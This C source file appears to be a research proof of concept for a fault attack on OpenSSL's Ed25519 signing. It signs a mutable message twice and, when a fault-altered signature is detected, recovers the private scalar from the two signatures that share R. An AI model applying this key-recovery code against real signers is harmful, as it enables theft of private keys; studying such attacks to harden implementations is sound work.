#include <stdio.h>
#include <stdint.h>
#include <gmp.h>

#include "openssl/conf.h"
#include "openssl/evp.h"
#include "openssl/err.h"
#include "openssl/sha.h"

#include "pretty_print.h"


#define SIGN_RUNS 2

static uint8_t kmsg[] 					= {1, 2, 3, 4};
static const uint8_t kmsg_original[] 	= {1, 2, 3, 4};
uint8_t sig[SIGN_RUNS][64];

// Function declarations
int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len);
int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t s2);

int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t s2)
{
	// Configure pretty print
	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:recover_a()}");
	pretty_print_text("Recover secret a:");

	pretty_print_v_mpz("R  =", R);
	pretty_print_v_mpz("A  =", A);
	pretty_print_v_mpz("s1 =", s1);
	pretty_print_v_mpz("s2 =", s2);

	// Compute hashes h1, h2
	mpz_t h1, h2, h, s, tmp, l;
	mpz_inits(h1, h2, h, s, tmp, l, NULL);
	if (!sha512(h1, R, A, kmsg_original, sizeof(kmsg_original))
		|| !sha512(h2, R, A, kmsg, sizeof(kmsg))) {
		pretty_print_text_col("Error computing hashes!", PP_COL_RED);
		goto err;
	}
	
	// l = 2^252 + 27742317777372353535851937790883648493 (see Ed25519)
	mpz_set_str(tmp, "27742317777372353535851937790883648493", 10);
	mpz_ui_pow_ui(l, 2, 252);
	mpz_add(l, l, tmp);
	
	mpz_mod(h1, h1, l);
	mpz_mod(h2, h2, l);

	pretty_print_v_mpz("l          =", l);
	pretty_print_v_mpz("h1 (mod l) =", h1);
	pretty_print_v_mpz("h2 (mod l) =", h2);

	// recover secret a = (s1 - s2) / (h1 - h2)
	//                  = (s1 - s2) * (h1 - h2)^-1
	mpz_sub(h, h1, h2);
	mpz_mod(h, h, l);
	if (!mpz_invert(h, h, l)) {
		pretty_print_text_col("There is no modular inverse of h = (h1 - h2)!", PP_COL_RED);
		goto err;
	}
	mpz_sub(s, s1, s2);
	mpz_mod(s, s, l);
	mpz_mul(a, s, h);
	mpz_mod(a, a, l);

	pretty_print_v_mpz("a =", a);

	// Recreate signatures
	pretty_print_v_text("Checking a:");
	// r = s - H()*a
	mpz_mul(h, h1, a);
	mpz_mod(h, h, l);
	mpz_sub(tmp, s1, h);
	mpz_mod(tmp, tmp, l);

	// s = (r + H()*a) mod l
	mpz_add(tmp, tmp, h);
	mpz_mod(tmp, tmp, l);

	if (mpz_cmp(s1, tmp) == 0)
		pretty_print_text_col("Secret a successfully recovered.", PP_COL_GREEN);
	else
		pretty_print_text_col("Could not recreate signature.", PP_COL_RED);

	mpz_clears(h1, h2, h, s, tmp, l, NULL);
	pretty_print_cfg_rm();
	return 1;

err:
	mpz_clears(h1, h2, h, s, tmp, l, NULL);
	pretty_print_cfg_rm();
	return 0;
}

int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len) 
{
	// Configure pretty print
	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:sha512()}");
	pretty_print_v_text("Computing SHA512");
	
	uint8_t *a_R, *a_A;
	size_t a_R_len, a_A_len;

	a_R = mpz_export(NULL, &a_R_len, -1, sizeof(uint8_t), 0, 0, R);
	a_A = mpz_export(NULL, &a_A_len, -1, sizeof(uint8_t), 0, 0, A);

	// OpenSSL SHA512
	uint8_t a_h[SHA512_DIGEST_LENGTH];
	EVP_MD_CTX *hash_ctx;
	unsigned int h_len;

	if ((hash_ctx = EVP_MD_CTX_new()) == NULL)
		goto err;

	// Compute hash
	if (!EVP_DigestInit_ex(hash_ctx, EVP_sha512(), NULL)
		|| !EVP_DigestUpdate(hash_ctx, a_R, a_R_len)
		|| !EVP_DigestUpdate(hash_ctx, a_A, a_A_len)
		|| !EVP_DigestUpdate(hash_ctx, m, m_len)
		|| !EVP_DigestFinal_ex(hash_ctx, a_h, &h_len))
		goto err;

	mpz_import(h, h_len, -1, sizeof(uint8_t), 0, 0, a_h);

	EVP_MD_CTX_free(hash_ctx);
	free(a_R);
	free(a_A);
	pretty_print_cfg_rm();
	return 1;

err:
	free(a_R);
	free(a_A);
	ERR_print_errors_fp(stderr);
	pretty_print_cfg_rm();
	return 0;
}

int main(int arc, char *argv[])
{
	pp_verbose = 1;

	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:main()}");
	int ret;

	// Initialize the one and only crypto lib
	OPENSSL_init_crypto(0, NULL);
	OpenSSL_add_all_algorithms();

	// Load the human readable error strings for libcrypto
	ERR_load_crypto_strings();

	EVP_PKEY *pkey = NULL;
	EVP_PKEY_CTX *pctx = NULL;
	EVP_MD_CTX  *mdctx = NULL;
	size_t sig_len = sizeof(sig[0]);

	uint8_t pub[32];
	size_t pub_len = sizeof(pub);
	
	// Generate keys
	// Doc: https://www.openssl.org/docs/man1.1.1/man7/Ed25519.html
	pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, NULL);
	if (!EVP_PKEY_keygen_init(pctx) ||
		!EVP_PKEY_keygen(pctx, &pkey))
		goto err;

	// Print public key
	EVP_PKEY_get_raw_public_key(pkey, pub, &pub_len);
	pretty_print("Raw public key:", pub, pub_len);

	// Sign message
	// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestSignInit.html
	mdctx = EVP_MD_CTX_new();
	for (int sign_run = 0; sign_run < SIGN_RUNS; sign_run++) {
		if (!EVP_DigestSignInit(mdctx, &pctx, NULL, NULL, pkey))
		goto err;

		// One-shot-sign (update and final are not supported with Ed25519)
		pretty_print_v_text("Start Ed25519 sign");
		if (!EVP_DigestSign(mdctx, sig[sign_run], &sig_len, kmsg, sizeof(kmsg)))
			goto err;
		pretty_print_v_text("End Ed25519 sign");

		// Print signature
		pretty_print("Signature (R,s) = ", sig[sign_run], sig_len);
		pretty_print("    R =", sig[sign_run], sig_len/2);
		pretty_print("    s =", sig[sign_run] + sig_len/2, sig_len/2);

		// Check signature
		// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestVerifyInit.html
		if (!EVP_DigestVerifyInit(mdctx, &pctx, NULL, NULL, pkey))
			goto err;
		ret = EVP_DigestVerify(mdctx, sig[sign_run], sig_len, kmsg_original, sizeof(kmsg_original));
		if (ret == 1)
			pretty_print_text_col("Signature successfully verified.", PP_COL_GREEN);
		else if (ret == 0)
			pretty_print_text_col("Signature could not be verified.", PP_COL_RED);
		else
			goto err;
	}

	// Calculate secret a
	if (ret == 0 && SIGN_RUNS >= 2) {

		mpz_t A, R, s1, s2, a;
		mpz_inits(A, R, s1, s2, a, NULL);
		mpz_import(A, pub_len, -1, sizeof(pub[0]), 0, 0, pub);
		mpz_import(R, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0]);
		mpz_import(s1, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0] + 32);
		mpz_import(s2, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[1] + 32);

		recover_a(a, A, R, s1, s2);
		pretty_print_mpz("a =", a);

		mpz_clears(a, A, R, s1, s2, NULL);
	}
	
	// Free stuff
	EVP_MD_CTX_free(mdctx);
	//EVP_PKEY_CTX_free(pctx); <- pctx became part of mdctx which is freed already

	// Removes all digests and ciphers
	EVP_cleanup();

	// if you omit the next, a small leak may be left when you make use of the BIO (low level API) for e.g. base64 transformations
	CRYPTO_cleanup_all_ex_data();

	// Remove error strings
	ERR_free_strings();

	pretty_print_cfg_rm();
	return 0;

err:
	ERR_print_errors_fp(stderr);
	pretty_print_cfg_rm();
	return 0;
}